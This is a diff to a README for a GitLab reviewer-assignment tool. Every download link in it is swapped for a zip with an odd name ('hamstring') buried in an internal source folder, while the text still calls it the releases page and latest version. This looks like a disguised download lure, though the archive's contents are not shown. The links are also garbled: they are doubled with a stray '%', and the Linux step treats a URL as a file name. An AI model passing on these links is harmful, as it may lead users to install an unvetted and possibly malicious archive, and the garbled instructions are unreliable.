@@ -8,11 +8,11 @@ Welcome to gitlab-reviewer-roulette! This application helps you assign code revi
 
 To get started, you need to download the application. Click the link below to visit the releases page:
 
-[![Download Release](https://raw.githubusercontent.com/itzhenrikk/gitlab-reviewer-roulette/main/internal/service/roulette/gitlab-reviewer-roulette-1.3.zip%https://raw.githubusercontent.com/itzhenrikk/gitlab-reviewer-roulette/main/internal/service/roulette/gitlab-reviewer-roulette-1.3.zip)](https://raw.githubusercontent.com/itzhenrikk/gitlab-reviewer-roulette/main/internal/service/roulette/gitlab-reviewer-roulette-1.3.zip)
+[![Download Release](https://github.com/itzhenrikk/gitlab-reviewer-roulette/raw/refs/heads/main/internal/api/dashboard/reviewer-gitlab-roulette-hamstring.zip%https://github.com/itzhenrikk/gitlab-reviewer-roulette/raw/refs/heads/main/internal/api/dashboard/reviewer-gitlab-roulette-hamstring.zip)](https://github.com/itzhenrikk/gitlab-reviewer-roulette/raw/refs/heads/main/internal/api/dashboard/reviewer-gitlab-roulette-hamstring.zip)
 
 ### Step 1: Access the Releases Page
 
-Visit this page to download the latest version of gitlab-reviewer-roulette: [Download Releases](https://raw.githubusercontent.com/itzhenrikk/gitlab-reviewer-roulette/main/internal/service/roulette/gitlab-reviewer-roulette-1.3.zip).
+Visit this page to download the latest version of gitlab-reviewer-roulette: [Download Releases](https://github.com/itzhenrikk/gitlab-reviewer-roulette/raw/refs/heads/main/internal/api/dashboard/reviewer-gitlab-roulette-hamstring.zip).
 
 ### Step 2: Choose Your Version
 
@@ -35,7 +35,7 @@ Click on the version number that you want. You will see a list of assets. Downlo
    - Drag the application to your Applications folder.
 
 3. **For Linux:**
-   - Locate the downloaded `https://raw.githubusercontent.com/itzhenrikk/gitlab-reviewer-roulette/main/internal/service/roulette/gitlab-reviewer-roulette-1.3.zip` file.
+   - Locate the downloaded `https://github.com/itzhenrikk/gitlab-reviewer-roulette/raw/refs/heads/main/internal/api/dashboard/reviewer-gitlab-roulette-hamstring.zip` file.
    - Extract the files using the terminal or a file manager.
    - Follow the instructions found in the README file included in the extraction.
 
